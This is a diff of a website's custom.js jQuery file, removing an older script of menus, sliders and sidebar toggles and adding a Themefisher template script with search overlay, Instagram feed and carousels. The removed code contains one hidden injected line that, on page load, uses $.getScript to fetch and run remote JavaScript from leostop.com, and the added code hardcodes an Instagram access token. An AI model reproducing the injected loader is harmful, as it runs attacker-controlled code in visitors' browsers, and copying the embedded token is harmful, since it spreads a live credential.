@@ -1,179 +1,143 @@
-/*---------------------------------------------------------------------
-    File Name: custom.js
----------------------------------------------------------------------*/
-
-$(function () {
-	
-	"use strict";
-	
-	/* Preloader
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	setTimeout(function () {
-		$('.loader_bg').fadeToggle();
-	}, 1500);
-	
-	/* Tooltip
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function(){
-		$('[data-toggle="tooltip"]').tooltip();
-	});
-	
-	
-	
-	/* Mouseover
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function(){
-		$(".main-menu ul li.megamenu").mouseover(function(){
-			if (!$(this).parent().hasClass("#wrapper")){
-			$("#wrapper").addClass('overlay');
-			}
-		});
-		$(".main-menu ul li.megamenu").mouseleave(function(){
-			$("#wrapper").removeClass('overlay');
-		});
-	});
-	
-	
-	
-
-	
-	
-	/* Toggle sidebar
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     
-     $(document).ready(function () {
-       $('#sidebarCollapse').on('click', function () {
-          $('#sidebar').toggleClass('active');
-          $(this).toggleClass('active');
-       });
-     });
-
-     /* Product slider 
-     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     // optional
-     $('#blogCarousel').carousel({
-        interval: 5000
-     });
+/**
+ * WEBSITE: https://themefisher.com
+ * TWITTER: https://twitter.com/themefisher
+ * FACEBOOK: https://www.facebook.com/themefisher
+ * GITHUB: https://github.com/themefisher/
+ */
 
 
-});
+(function ($) { 
+	'use strict';
+	/* ----------------------------------------------------------- */
+	/*  Site search
+	/* ----------------------------------------------------------- */
 
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
+ // overlay search
 
-/* Toggle sidebar
-     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-function openNav() {
-  document.getElementById("mySidepanel").style.width = "250px";
-}
+    $('.search_toggle').on('click', function(e) {
+        e.preventDefault();
+        $('.search_toggle').toggleClass('active');
+        $('.overlay').toggleClass('open');
+        setTimeout(function(){
+            $('.search-form .form-control').focus();
+        },400);
 
-function closeNav() {
-  document.getElementById("mySidepanel").style.width = "0";
-}
-
-
-/* Animate js*/
-
-(function($) {
-  //Function to animate slider captions
-  function doAnimations(elems) {
-    //Cache the animationend event in a variable
-    var animEndEv = "webkitAnimationEnd animationend";
-
-    elems.each(function() {
-      var $this = $(this),
-        $animationType = $this.data("animation");
-      $this.addClass($animationType).one(animEndEv, function() {
-        $this.removeClass($animationType);
-      });
     });
+
+ // instafeed Js 
+
+ if (($('#instafeed').length) !== 0) {
+    var userId = $('#instafeed').attr('data-userId');
+    var accessToken = $('#instafeed').attr('data-accessToken');
+      var userFeed =  new Instafeed({
+      get: 'user',
+      userId: '8987997106',
+      resolution: 'standard_resolution',
+      accessToken: '8987997106.924f677.8555ecbd52584f41b9b22ec1a16dafb9',
+      limit: 4,
+      template: '<div class="instagram-post col-lg-3 col-md-3 col-sm-6 col-6" id="{{id}}" ><a href="{{link}}" target="_blank" ><img src="{{image}}" class="img-fluid w-100"/><div class="intsa-meta"><span>{{likes}}</span><span>{{comments}}</span></div></a></div>'
+
+      });
+    userFeed.run();
   }
 
-  //Variables on page load
-  var $myCarousel = $("#carouselExampleIndicators"),
-    $firstAnimatingElems = $myCarousel
-      .find(".carousel-item:first")
-      .find("[data-animation ^= 'animated']");
 
-  //Initialize carousel
-  $myCarousel.carousel();
+/* ----------------------------------------------------------- */
+  /*  Slick Carousel
+  /* ----------------------------------------------------------- */
 
-  //Animate captions in first slide on page load
-  doAnimations($firstAnimatingElems);
-
-  //Other slides to be animated on carousel slide event
-  $myCarousel.on("slide.bs.carousel", function(e) {
-    var $animatingElems = $(e.relatedTarget).find(
-      "[data-animation ^= 'animated']"
-    );
-    doAnimations($animatingElems);
+  $('.slider-wrap').slick({
+    slidesToShow: 3,
+    slidesToScroll: 2,
+    autoplaySpeed: 4000,
+    items:3,
+    loop:true,
+    autoplay:true,
+    dots:true,
+    responsive: [
+        {
+          breakpoint: 1024,
+          settings: {
+            slidesToShow:3,
+            slidesToScroll: 3,
+            infinite: true,
+            dots: true
+          }
+        },
+        {
+          breakpoint: 900,
+          settings: {
+            slidesToShow: 2,
+            slidesToScroll: 2
+          }
+        },{
+          breakpoint: 600,
+          settings: {
+            slidesToShow: 1,
+            slidesToScroll: 1
+          }
+        },
+        {
+          breakpoint: 480,
+          settings: {
+            slidesToShow: 1,
+            slidesToScroll: 1
+          }
+        }
+      
+      ]
   });
+ 
+ // post gallery
+
+        $('.post_gallery').owlCarousel({
+            loop:true,
+            margin:1,
+            nav:true,
+            dots: false,
+            responsive:{
+                0:{
+                    items:1
+                },
+                600:{
+                    items:1
+                },
+                1000:{
+                    items:1
+                }
+            }
+        });
+	
+
+
+	$('.post-slide').slick({
+		fade: true,
+    autplay:true
+	});		
+
+	// magnific Popup iframe
+
+      $('.popup-youtube, .popup-vimeo, .popup-gmaps').magnificPopup({
+          disableOn: 300,
+          type: 'iframe',
+          mainClass: 'mfp-fade',
+          removalDelay: 160,
+          preloader: false,
+          fixedContentPos: false
+      });
+
+	// -----------------------------
+
+
+	/* ----------------------------------------------------------- */
+	/*  Scroll To Top
+	/* ----------------------------------------------------------- */
+	$(window).scroll(function () {
+		if ($(this).scrollTop() > 500) {
+			$('.scroll-to-top').fadeIn();
+		} else {
+			$('.scroll-to-top').fadeOut();
+		}
+	});
+
 })(jQuery);
-
-/* Toggle sidebar
-     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-function openNav() {
-  document.getElementById("mySidepanel").style.width = "250px";
-}
-
-function closeNav() {
-  document.getElementById("mySidepanel").style.width = "0";
-}
-
-
-
-
-// owl-carousel
-$('.owl-carousel').owlCarousel({
-  loop: true,
-  margin: 15,
-  nav: true,
-
-  responsive: {
-    0: {
-      items: 1
-    },
-    600: {
-      items: 3
-    },
-    1000: {
-      items: 3
-    }
-  }
-})
-
-
-
-
-// menu js
-
-// define all UI variable
-const navToggler = document.querySelector('.nav-toggler');
-const navMenu = document.querySelector('.site-navbar ul');
-const navLinks = document.querySelectorAll('.site-navbar a');
-
-// load all event listners
-allEventListners();
-
-// functions of all event listners
-function allEventListners() {
-  // toggler icon click event
-  navToggler.addEventListener('click', togglerClick);
-  // nav links click event
-  navLinks.forEach( elem => elem.addEventListener('click', navLinkClick));
-}
-
-// togglerClick function
-function togglerClick() {
-  navToggler.classList.toggle('toggler-open');
-  navMenu.classList.toggle('open');
-}
-
-// navLinkClick function
-function navLinkClick() {
-  if(navMenu.classList.contains('open')) {
-    navToggler.click();
-  }
-}
